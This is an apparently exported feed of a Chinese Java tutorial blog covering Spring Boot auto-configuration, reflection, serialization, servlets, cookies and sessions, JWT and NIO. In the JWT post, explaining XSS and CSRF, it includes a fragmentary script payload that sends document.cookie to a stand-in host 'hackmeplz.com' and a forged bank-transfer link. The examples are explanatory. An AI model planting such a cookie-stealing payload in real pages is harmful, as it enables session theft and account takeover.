title="getAutoConfigurationEntry方法"></a>getAutoConfigurationEntry方法</h5><p>传入两个参数</p><ul><li>autoConfigurationMetadata自顶配置元信息</li><li>annotationMetadata注解元信息</li></ul><p>注解元信息的参数（配置类上添加的@ComponentScan(Exclude)）：</p><p>excludeName和exclude表示需要排除扫描自动配置的类，String[0]表示了没有需要排除的</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/8.png"><pre><code class="java">//获取注解元信息参数AnnotationAttributes attributes = this.getAttributes(annotationMetadata);//调用getCandidateConfigurations获取需要自动配置的类或者功能List&lt;String&gt; configurations = this.getCandidateConfigurations(annotationMetadata, attributes);//去重configurations = this.removeDuplicates(configurations);//检查并排除exclude类Set&lt;String&gt; exclusions = this.getExclusions(annotationMetadata, attributes);this.checkExcludedClasses(configurations, exclusions);configurations.removeAll(exclusions);configurations = this.filter(configurations, autoConfigurationMetadata);this.fireAutoConfigurationImportEvents(configurations, exclusions);return new AutoConfigurationImportSelector.AutoConfigurationEntry(configurations, exclusions);</code></pre><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/7.png"><h5 id="getCandidateConfigurations"><a href="#getCandidateConfigurations" class="headerlink" title="getCandidateConfigurations"></a>getCandidateConfigurations</h5><p>负责加载META-INF/spring.factories中的配置的类，这些类就是SpringBoot提供的所需要加载的那些*AutoConfiguration类，也就是要注册的Bean或功能，获取到候选类的BeanName返回一个List</p><p>借助SpringFactoriesLoader类实现加载自动配置类</p><pre><code class="java">protected List&lt;String&gt; getCandidateConfigurations(AnnotationMetadata metadata, AnnotationAttributes attributes) {    //加载类路径下META-INF/spring.factories中的自动配置类        List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(this.getSpringFactoriesLoaderFactoryClass(), this.getBeanClassLoader());        Assert.notEmpty(configurations, &quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;);        return configurations;    }</code></pre><p>返回结果如下:</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/1.1.png"><h6 id="loadFactoryNames"><a href="#loadFactoryNames" class="headerlink" title="loadFactoryNames"></a>loadFactoryNames</h6><p>SpringBoot使用ClassLoader类加载机制加载META-INF/spring.factories</p><p>将根据EnableAutoConfiguration类名称去加载需要的类或者功能</p><pre><code class="java">public static List&lt;String&gt; loadFactoryNames(Class&lt;?&gt; factoryClass, @Nullable ClassLoader classLoader) {        String factoryClassName = factoryClass.getName();        return (List)loadSpringFactories(classLoader).getOrDefault(factoryClassName, Collections.emptyList());    }</code></pre><blockquote><p>SpringFactoriesLoader的实现机制跟util包下的 ServiceLoader（SPL）实现机制类似，是一种服务查找机制，为接口查找服务实现类，感兴趣的可以去了解一下</p></blockquote>]]></content>
    
    <summary type="html">
    
      我们都知道一个SpringBoot主配置类只要标注上&lt;u&gt;@SpringBootApplication&lt;/u&gt;的注解，Spring就会帮我们自动配置各个组件和实例化Bean，我们来通过源码分析一下SpringBoot自动配置原理。
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="分布式" scheme="https://www.dzou.top/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="SpringBoot" scheme="https://www.dzou.top/tags/SpringBoot/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="Spring" scheme="https://www.dzou.top/tags/Spring/"/>
    
      <category term="微服务" scheme="https://www.dzou.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java反射机制基础--理解与使用</title>
    <link href="https://www.dzou.top/post/40dcec56.html"/>
    <id>https://www.dzou.top/post/40dcec56.html</id>
    <published>2019-07-24T02:51:07.000Z</published>
    <updated>2019-08-04T04:19:54.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>反射机制是<strong>运行状态</strong>中对任意一个类、对象知道它的方法和属性</p><p> <strong>JAVA反射（放射）机制：“程序运行时，允许改变程序结构或变量类型，这种语言称为动态语言”。<br>反射最重要的用途就是开发各种通用框架。很多框架（比如 Spring）都是配置化的（比如通过 XML 文件配置 Bean），为了保证框架的通用性，它们可能需要根据配置文件加载不同的对象或类，调用不同的方法，这个时候就必须用到反射，运行时动态加载需要加载的对象。</strong></p><p>一般地，我们用 instanceof 关键字来判断是否为某个类的实例。同时我们也可以借助反射中 Class 对象的 isInstance() 方法来判断是否为某个类的实例，它是一个 native 方法。</p><p><strong>创建实例</strong><br>先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。</p><pre><code class="java">    //获取String所对应的Class对象    Class&lt;?&gt; c = String.class;    //获取String类带一个String参数的构造器    Constructor constructor = c.getConstructor(String.class);    //根据构造器创建实例    Object obj = constructor.newInstance(&quot;23333&quot;);    System.out.println(obj);    public native boolean isInstance(Object obj);</code></pre><h2 id="获取反射入口三种方式（Class）："><a href="#获取反射入口三种方式（Class）：" class="headerlink" title="获取反射入口三种方式（Class）："></a>获取反射入口三种方式（Class）：</h2><ul><li><p>Class.forname(全类名) 需要异常捕获 </p></li><li><p>类名.Class</p></li><li><p>对象.getClass()</p></li></ul><p><strong>获取某个Class对象的方法集合，主要有以下几个方法</strong></p><pre><code>getDeclaredMethods 方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。public Method[] getDeclaredMethods() throws SecurityExceptiongetMethods 方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。public Method[] getMethods() throws SecurityExceptiongetMethod 方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象。public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)</code></pre><p><strong>获取类的成员变量（字段）信息</strong></p><pre><code>getFiled：访问公有的成员变量getDeclaredField：所有已声明的成员变量，但不能得到其父类的成员变量getFileds 和 getDeclaredFields 方法用法同上（参照 Method）。</code></pre><p>当我们从类中获取了一个方法后，我们就可以用 invoke() 方法来调用这个方法。invoke 方法的原型为:</p><pre><code>public Object invoke(Object obj, Object... args)        throws IllegalAccessException, IllegalArgumentException,           InvocationTargetException</code></pre><p> <strong>如果不需要动态地创建一个对象，那么就不需要用反射</strong></p>]]></content>
    
    <summary type="html">
    
      JAVA反射（放射）机制：“程序运行时，允许改变程序结构或变量类型，这种语言称为动态语言”。反射最重要的用途就是开发各种通用框架。很多框架（比如 Spring）都是配置化的（比如通过 XML 文件配置 Bean）
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>java序列化Serializable和反序列化状态修饰符transient</title>
    <link href="https://www.dzou.top/post/616dc7a4.html"/>
    <id>https://www.dzou.top/post/616dc7a4.html</id>
    <published>2019-07-24T02:46:21.000Z</published>
    <updated>2019-08-02T14:30:36.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Serializable序列化接口"><a href="#Serializable序列化接口" class="headerlink" title="Serializable序列化接口"></a>Serializable序列化接口</h2><p>使用序列化接口最重要的两个原因是：</p><p>1、将对象的状态保存在存储媒体中以便可以在以后重新创建出完全相同的副本；</p><p>2、按值将对象从一个应用程序域发送至另一个应用程序域。</p><p>实现serializable接口的作用是就是可以把对象存到字节流，然后可以恢复。所以你想如果你的对象没实现序列化怎么才能进行网络传输呢，要网络传输就得转为字节流，所以在分布式应用中，你就得实现序列化，如果你不需要分布式应用，那就没那个必要实现序列化。</p><h2 id="tranisent"><a href="#tranisent" class="headerlink" title="tranisent"></a>tranisent</h2><p>“不可序列化状态”。<br>打个比方，如果一个用户有一些敏感信息（譬如密码，银行卡号等），为了安全起见，不希望在网络操作（主要涉及到序列化操作，本地序列化缓存也适用）中被传输。这些信息对应的变量就可以被定义为transient类型。换句话说，这个字段的生命周期仅存于调用者的内存中。<br>如定义类：</p><pre><code class="java">    public class People implements Serializable {    private static final long serialVersionUID = 8294180014912103005L;    /**    * 用户名    */    private String username;    /**    * 密码    */    private transient String password;    }</code></pre><p>密码字段为transient，这时候如果对该对象进行序列化，这个密码字段是不会被保存的。</p>]]></content>
    
    <summary type="html">
    
      实现serializable接口的作用是就是可以把对象存到字节流，然后可以恢复。所以你想如果你的对象没实现序列化怎么才能进行网络传输呢，要网络传输就得转为字节流
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="序列化" scheme="https://www.dzou.top/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>转发和重定向的区别</title>
    <link href="https://www.dzou.top/post/67d1f796.html"/>
    <id>https://www.dzou.top/post/67d1f796.html</id>
    <published>2019-07-24T02:42:22.000Z</published>
    <updated>2019-08-02T14:29:25.920Z</updated>
    
    <content type="html"><![CDATA[<h2 id="转发和重定向区别"><a href="#转发和重定向区别" class="headerlink" title="转发和重定向区别"></a>转发和重定向区别</h2><h3 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h3><p>forward，由服务器发出，把request、response处理权转交给其他客户端，并不会失效<br>客户首先发送一个请求到服务器端，服务器端发现匹配的servlet，并指定它去执行，当这个servlet执行完之后，它要调用getRequestDispacther()方法，把请求转发给指定的页面，在一个请求里完成</p><pre><code class="java">//转发,转发是在服务器端转发的，客户端是不知道的request.getRequestDispatcher(&quot;/index.jsp&quot;).forward(request, response);</code></pre><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>sendRedirect，由客户端发出，请求servlet，request会失效<br> 客户发送一个请求到服务器，服务器匹配servlet，这都和请求转发一样，servlet处理完之后调用了sendRedirect()这个方法，这个方法是response的方法，所以，当这个servlet处理完之后，看到response.senRedirect()方法，立即向客户端返回这个响应，响应行告诉客户端你必须要再发送一个请求，去访问新页面，紧接着客户端受到这个请求后，立刻发出一个新的请求</p><pre><code class="java">//重定向，不会共享requestresponse.sendRedirect(&quot;/student_list.jsp&quot;);response.sendRedirect(request.getContextPath() + &quot;/student_list.jsp&quot;);</code></pre><ul><li><p>转发在服务器端完成的；重定向是在客户端完成的<br>转发的速度快；重定向速度慢</p></li><li><p>转发的是同一次请求；重定向是两次不同请求</p></li><li><p>转发不会执行转发后的代码；重定向会执行重定向之后的代码</p></li><li><p>转发地址栏没有变化；重定向地址栏有变化</p></li><li><p>转发必须是在同一台服务器下完成；重定向可以在不同的服务器下完成</p></li></ul>]]></content>
    
    <summary type="html">
    
      转发和重定向区别,forward，由服务器发出，把request、response处理权转交给其他客户端，并不会失效
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Java中使用servlet内置对象request获取IP地址</title>
    <link href="https://www.dzou.top/post/9a42916a.html"/>
    <id>https://www.dzou.top/post/9a42916a.html</id>
    <published>2019-07-24T02:35:34.000Z</published>
    <updated>2019-08-02T12:03:02.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java中使用servlet内置对象request获取IP地址"><a href="#Java中使用servlet内置对象request获取IP地址" class="headerlink" title="Java中使用servlet内置对象request获取IP地址"></a>Java中使用servlet内置对象request获取IP地址</h2><p>Controller中获取HttpServletRequest对象request，调用下面代码</p><pre><code class="java">String ip = request.getHeader(&quot;x-forwarded-for&quot;);                if(ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)){                    ip = request.getHeader(&quot;Proxy-Client-IP&quot;);                }                if(ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)){                    ip = request.getHeader(&quot;WL-Proxy-Client-IP&quot;);                }                if(ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)){                    ip = request.getRemoteAddr();                }</code></pre>]]></content>
    
    <summary type="html">
    
      Java中使用servlet内置对象request获取IP地址Controller中获取HttpServletRequest对象request，调用下面代码
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="servlet" scheme="https://www.dzou.top/tags/servlet/"/>
    
      <category term="request" scheme="https://www.dzou.top/tags/request/"/>
    
  </entry>
  
  <entry>
    <title>cookie和session</title>
    <link href="https://www.dzou.top/post/319bf02d.html"/>
    <id>https://www.dzou.top/post/319bf02d.html</id>
    <published>2019-07-24T02:26:22.000Z</published>
    <updated>2019-08-02T14:29:54.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="session-and-cookie"><a href="#session-and-cookie" class="headerlink" title="session and cookie"></a>session and cookie</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>属性：</p><ul><li>Max-Age有效期  ：正表示相对创建时间，负表示使用默认（关闭浏览器销毁），零表示销毁</li><li>Path在url那个路径下有效（“/”）表示整个web项目下</li><li>secure：设置了属性secure，cookie只有在https协议加密情况下才会发送给服务端</li></ul><p>服务端创建cookie：<br>1.new Cookie<br>2.response.addCookie<br>3.Cookie[] cookies = request.getCookies;<br>前端：ajax获取cookie</p><p>由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。</p><p>其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p> session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。<br>session id就是session的标识符<br>除非程序通知服务器删除一个session，否则服务器会一直保留。大部分session机制都使用会话cookie来保存session id，而关闭浏览器后这个session id就消失了，再次连接服务器时也就无法找到原来的session。<br>恰恰是由于关闭浏览器不会导致session被删除，迫使服务器为seesion设置了一个失效时间，当距离客户端上一次使用session的时间超过这个失效时间时，服务器就可以认为客户端已经停止了活动，才会把session删除以节省存储空间<br>调用 session.invalidate 使得session失效</p>]]></content>
    
    <summary type="html">
    
      其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="网络编程" scheme="https://www.dzou.top/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
      <category term="session" scheme="https://www.dzou.top/tags/session/"/>
    
      <category term="cookie" scheme="https://www.dzou.top/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>Jwt(Json Web Token)Web安全工具使用</title>
    <link href="https://www.dzou.top/post/d43b6d5c.html"/>
    <id>https://www.dzou.top/post/d43b6d5c.html</id>
    <published>2019-07-24T02:22:02.000Z</published>
    <updated>2019-08-02T12:02:16.082Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JWT（Json-Web-Token）"><a href="#JWT（Json-Web-Token）" class="headerlink" title="JWT（Json Web Token）"></a>JWT（Json Web Token）</h2><p>主要防止token被篡改和token信息被获取，无法防止token被获取（存在cookie或者localstorage都要风险），使用cookie的httponly属性来防止xss攻击（防止使用js读取cookie值，document.cookie）</p><p><img src="https://img-blog.csdnimg.cn/20190603140012847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="token传统方式"><a href="#token传统方式" class="headerlink" title="token传统方式"></a>token传统方式</h3><p>前后端分离通过Restful API进行数据交互时，如何验证用户的登录信息及权限。在原来的项目中，使用的是最传统也是最简单的方式，前端登录，后端根据用户信息生成一个token，并保存这个 token 和对应的用户id到数据库或Session中，接着把 token 传给用户，存入浏览器 cookie，之后浏览器请求带上这个cookie，后端根据这个cookie值来查询用户，验证是否过期。</p><ul><li>xss：利用js脚本输入在网页中，如论坛等，获取你的cookie值<br>如：img src=”x” /&gt; a.src=’<a href="https://hackmeplz.com/yourCookies.png/?cookies=’" rel="external nofollow noopener noreferrer" target="_blank">https://hackmeplz.com/yourCookies.png/?cookies=’</a></li></ul><p>+document.cookie;return a}())</p><ul><li>csrf：利用你在某网站保存的cookie信息来操作你的账号，利用一张图或者链接等形式，当你访问或点击时利用你在某网站的cookie操作你的账号<br>如：&lt;img src=”” href=”<a href="http://www.yourbank.com?&amp;transfer" rel="external nofollow noopener noreferrer" target="_blank">www.yourbank.com?&amp;transfer</a> = true”</li></ul><p>jwt不能主动销毁，只能等token到期时才会自动销毁</p><h3 id="项目中的使用"><a href="#项目中的使用" class="headerlink" title="项目中的使用"></a>项目中的使用</h3><p><strong>我在项目中使用jwt来实现用户的登录，只适用于访问人数较少还需保持安全性（高并发数据库查询耗费服务器资源太多）</strong></p><p>安全防范思想：利用userId作为token的参数，创建一个token，再获取客户端ip地址，再构造一个cookie版本号，三者连接起来作为fullToken在登录时传入数据库保存，登录成功后创建一个session保持用户在网站内的登录状态，在用户注销登录的时候更改cookie的存活时间为0，更改cookie的版本号（+1），session invalidate，在访问网站时，cookie和session都被销毁，只能重新登录（会创建新的jwt更新数据库的fullToken值）<br>获取客户端ip来判断是否是你注册的时候的ip进行登录的，如果不是，无法登陆成功（保证一定的安全性）</p><h3 id="JWT组成"><a href="#JWT组成" class="headerlink" title="JWT组成"></a>JWT组成</h3><ul><li>头部(header)</li><li>载荷(payload)</li><li>签名(signature)。</li></ul><p>头部定义类型和加密方式；载荷部分放不是很重要的数据；签名使用定义的加密方式加密base64后的header和payload和一段你自己的加密key（密匙）。<br>最后的token由base64(header).base64(payload).base64(signatrue)组成。</p><p><strong>header：包含着类型和加密所用算法</strong><br><strong>payload：主要包含token存储的信息和销毁时间等</strong><br>其中userId就是token存储的最重要的信息</p><pre><code class="java">Map&lt;String, Object&gt; payload = new HashMap&lt;&gt;();            Date date = new Date();            payload.put(&quot;userId&quot;,userId.toString() );// 用户ID            payload.put(&quot;iss&quot;,&quot;face&quot;);// 生成者            payload.put(&quot;iat&quot;, date.getTime());// 生成时间            payload.put(&quot;ext&quot;, date.getTime() + 1000 * 60 * 60 * 12);// 过期时间12小时</code></pre><p><strong>signature：对头部和负载部分生成的base64值来接起来使用提供的密匙和加密方法进行加密，行成签名值</strong><br>最后一步签名的过程，实际上是对头部以及负载内容进行签名，防止内容被窜改。<br><img src="https://img-blog.csdnimg.cn/20190603135910404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后该jwt形式如下：</p><pre><code>eyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9</code></pre><p><strong>Java实现的jjwt开源库提供对jwt的支持</strong></p>]]></content>
    
    <summary type="html">
    
      JWT（Json Web Token）主要防止token被篡改和token信息被获取，无法防止token被获取（存在cookie或者localstorage都要风险）
    
    </summary>
    
      <category term="Web安全" scheme="https://www.dzou.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="安全" scheme="https://www.dzou.top/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>NIO学习笔记（IO、AIO、BIO）--更新中</title>
    <link href="https://www.dzou.top/post/e571ec33.html"/>
    <id>https://www.dzou.top/post/e571ec33.html</id>
    <published>2019-07-24T02:13:10.000Z</published>
    <updated>2019-08-02T11:50:57.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><p>I/O ? 或者输入/输出 ? 指的是计算机与外部世界或者一个程序与计算机的其余部分的之间的接口。它对于任何计算机系统都非常关键，因而所有 I/O 的主体实际上是内置在操作系统中的。单独的程序一般是让系统为它们完成大部分的工作。</p><p>在 Java 编程中，直到最近一直使用 流 的方式完成 I/O。所有 I/O 都被视为单个的字节的移动，通过一个称为 Stream 的对象一次移动一个字节。流 I/O 用于与外部世界接触。它也在内部使用，用于将对象转换为字节，然后再转换回对象。</p><p>传统流IO的好处是使用简单，将底层的机制都抽象成流，但缺点就是性能不足。而且IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。</p><h2 id="传统BIO（blocking-IO）"><a href="#传统BIO（blocking-IO）" class="headerlink" title="传统BIO（blocking IO）"></a>传统BIO（blocking IO）</h2><p>阻塞：accept方法，除非有socket返回，读写不能同时进行<br>当对Socket的输入流进行读取操作的时候，它会一直阻塞下去。<br>一个场景，由于网络延迟，导致数据发送缓慢。而由于使用的是阻塞IO，那么read方法一直处于阻塞状态，要等到数据传送完成才结束（返回-1）。那么这种场景下，在高并发。直接导致线程暴增、服务器宕机。<br><img src="https://img-blog.csdnimg.cn/20190604092946420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>在bio基础上，把传统多线程改为使用一定muxnum的线程池，形成伪异步IO模型，<br>实现一个或多个线程处理n个客户端，但是底层还是同步阻塞IO</strong></p><p><img src="https://img-blog.csdnimg.cn/20190604093325953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="java">//线程池 懒汉式的单例    private static ExecutorService executorService = Executors.newFixedThreadPool(60);</code></pre><p>CachedThreadPool线程池</p><p><strong>根本上无法解决高并发：因为限制了线程数量，如果发生大量并发请求，超过最大数量的线程就只能等待，直到线程池中的有空闲的线程可以被复用。</strong></p><h3 id="bio问题："><a href="#bio问题：" class="headerlink" title="bio问题："></a>bio问题：</h3><ul><li>1.没有一个socket，服务端都会开启一个线程处理</li><li>2.每一个处理操作完后，线程都会被销毁</li></ul><h2 id="NIO（new-io，Non-blocking-io）"><a href="#NIO（new-io，Non-blocking-io）" class="headerlink" title="NIO（new io，Non-blocking io）"></a>NIO（new io，Non-blocking io）</h2><p>netty框架中实现了NIO的封装</p><p>同步非阻塞IO</p><h3 id="缓冲区（Buffer）：存储写入或者读出的数据"><a href="#缓冲区（Buffer）：存储写入或者读出的数据" class="headerlink" title="缓冲区（Buffer）：存储写入或者读出的数据"></a><strong>缓冲区（Buffer）：存储写入或者读出的数据</strong></h3><p>  官方写到：<br>a Thread can ask channel to read data into a buffer ,While the channel reads data into buffer,the Thread can do else things.<br>所有数据都是用缓冲区处理的。在读取数据时，它是直接读到缓冲区中的；在写入数据时，也是写入到缓冲区中。任何时候访问NIO中的数据，都是通过缓冲区进行操作。</p><h3 id="通道（Channel）：同时读写-双向的"><a href="#通道（Channel）：同时读写-双向的" class="headerlink" title="通道（Channel）：同时读写 双向的"></a><strong>通道（Channel）：同时读写 双向的</strong></h3><p>  Channel主要分两大类：</p><pre><code>- SelectableChannel：用户网络读写- FileChannel：用于文件操作- ServerSocketChannel服务器tcp数据传输- SocketChannel客户端tcp数据传输</code></pre><h3 id="多路复用器（Selector）：提供选择已经就绪的任务的能力"><a href="#多路复用器（Selector）：提供选择已经就绪的任务的能力" class="headerlink" title="多路复用器（Selector）：提供选择已经就绪的任务的能力"></a><strong>多路复用器（Selector）：提供选择已经就绪的任务的能力</strong></h3><p>  官方写道：<br>A selector can use a thread to monitor multiple channels for even’s.<br>Selector会不断轮询注册在其上的Channel，如果某个Channel上面发生读或者写事件，这个Channel就处于就绪状态，会被Selector轮询出来，然后通过SelectionKey可以获取就绪Channel的集合，进行后续的I/O操作。</p><h3 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a><strong>服务端：</strong></h3><ul><li>1.打开ServerSocketChannel</li><li>2.设置为非阻塞</li><li>3.监听客户端端口，绑定监听端口</li><li>4.创建selector 把channel注册到selector上，监听我感兴趣的accept请求</li><li>5.开始listen：<br>   （1）轮询selector访问准备就绪的SelectionKey</li></ul><pre><code class="java">while(true){            selector.select();            //selector轮询准备就绪的key            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();            Iterator&lt;SelectionKey&gt; iterator = selectionKeys.iterator();            while(iterator.hasNext()){                SelectionKey selectionKey = iterator.next();                iterator.remove();                handlekey(selectionKey);            }        }</code></pre><pre><code> （2）监听到新的客户端接入，处理新的接入请求，将读写数据放在Buffer中</code></pre><pre><code class="java">if(selectionKey.isAcceptable()){            serverSocketChannel = (ServerSocketChannel) selectionKey.channel();            client = serverSocketChannel.accept();            client.configureBlocking(false);            client.register(selector,SelectionKey.OP_READ);        }else if(selectionKey.isReadable()){            client = (SocketChannel) selectionKey.channel();            receiveBuffer.clear();            -------------------------        }else if(selectionKey.isWritable()){            sendBuffer.clear();            //服务端向客户端发送数据            client = (SocketChannel) selectionKey.channel();            sendText = &quot;message from server:&quot;+flag++;            sendBuffer.put(sendText.getBytes());            sendBuffer.flip();            client.write(sendBuffer)；            client.register(selector,SelectionKey.OP_READ);        }</code></pre><pre><code></code></pre><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a><strong>客户端：</strong></h3><ul><li>1.打开socket通道</li><li>2.设置非阻塞</li><li>3.创建选择器selector 注册通道 SelectionKey.connect</li><li>4.socket连接服务器ip和端口</li><li>5.轮询selector已就绪的通道</li><li>6.处理通道请求的数据</li></ul><pre><code class="java">while (true) {            selector.select();            selectionKeys = selector.selectedKeys();            iterator = selectionKeys.iterator();            while (iterator.hasNext()) {                selectionKey = iterator.next();                if (selectionKey.isConnectable()) {                    System.out.println(&quot;client connect&quot;);                    client = (SocketChannel) selectionKey.channel();                    // 判断此通道上是否正在进行连接操作。                    // 完成套接字通道的连接过程。                    if (client.isConnectionPending()) {                        client.finishConnect();                        System.out.println(&quot;完成连接!&quot;);                        sendBuffer.clear();                        sendBuffer.put(&quot;Hello,Server&quot;.getBytes());                        sendBuffer.flip();                        client.write(sendBuffer);                    }                    client.register(selector, SelectionKey.OP_READ);                } else if (selectionKey.isReadable()) {                    client = (SocketChannel) selectionKey.channel();                    //将缓冲区清空以备下次读取                    receiveBuffer.clear();                    //读取服务器发送来的数据到缓冲区中                    count = client.read(receiveBuffer);                    if (count &gt; 0) {                        receiveText = new String(receiveBuffer.array(), 0, count);                        System.out.println(&quot;客户端接受服务器端数据--:&quot; + receiveText);                        client.register(selector, SelectionKey.OP_WRITE);                    }                } else if (selectionKey.isWritable()) {                    sendBuffer.clear();                    client = (SocketChannel) selectionKey.channel();                    sendText = &quot;message from client--&quot; + (flag++);                    sendBuffer.put(sendText.getBytes());                    //将缓冲区各标志复位,因为向里面put了数据标志被改变要想从中读取数据发向服务器,就要复位                    sendBuffer.flip();                    client.write(sendBuffer);                    System.out.println(&quot;客户端向服务器端发送数据--：&quot; + sendText);                    client.register(selector, SelectionKey.OP_READ);                }            }            selectionKeys.clear();        }</code></pre><p><img src="https://img-blog.csdnimg.cn/20190604203114930.png" alt="在这里插入图片描述"></p><h2 id="AIO、BIO、NIO理解"><a href="#AIO、BIO、NIO理解" class="headerlink" title="AIO、BIO、NIO理解"></a>AIO、BIO、NIO理解</h2><ul><li><p>AIO的做法是，每个水壶上装一个开关，当水开了以后会提醒对应的线程去处理。</p></li><li><p>NIO的做法是，叫一个线程不停的循环观察每一个水壶，根据每个水壶当前的状态去处理。</p></li><li><p>BIO的做法是，叫一个线程停留在一个水壶那，直到这个水壶烧开，才去处理下一个水壶。</p></li></ul>]]></content>
    
    <summary type="html">
    
      NIO/IO/New IO/非阻塞IO
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
